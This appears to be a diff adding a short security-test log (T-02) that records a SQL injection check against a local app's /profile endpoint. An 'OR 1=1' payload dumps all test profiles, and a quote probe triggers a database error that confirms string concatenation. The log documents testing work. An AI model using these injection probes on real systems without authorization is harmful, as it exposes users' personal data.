@@ -1,0 +1,13 @@
+=== T-02: SQL injection /profile?id ===
+-- baseline id=1 --
+[{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"}]
+-- injection: id=0 OR 1=1 (expect all profiles if vulnerable) --
+[{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"}, {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]
+-- injection with quote to test for syntax error (confirms string concatenation) --
+HTTP/1.0 500 Internal Server Error
+Server: BaseHTTP/0.6 Python/3.12.3
+Date: Thu, 29 Oct 2026 13:01:46 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 66
+
+{"error": "unrecognized token: \"'\"", "type": "OperationalError"}
